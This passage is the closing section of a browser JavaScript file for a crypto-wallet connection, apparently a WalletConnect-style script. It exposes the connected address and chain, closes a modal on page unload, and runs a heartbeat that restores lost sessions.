  window.getConnectedAddress = () => state.address;
  window.getConnectedChain = () => state.chain;

  // ===================================================================
  // 23. CLEANUP on unload
  // ===================================================================

  window.addEventListener('beforeunload', () => {
    if (state.modal) state.modal.closeModal();
  });

  // ===================================================================
  // 24. HEARTBEAT – keep connection alive
  // ===================================================================

  setInterval(async () => {
    if (state.isConnected && state.client) {
      try {
        // Ping to keep session alive
        const sessions = state.client.session.values();
        if (sessions.length === 0 && state.address) {
          // Session lost, try restore
          log('Heartbeat: session lost, attempting restore');
          await restoreSession();
        }
      } catch (_) {}
    }
  }, TIMEOUTS.HEARTBEAT);

})();
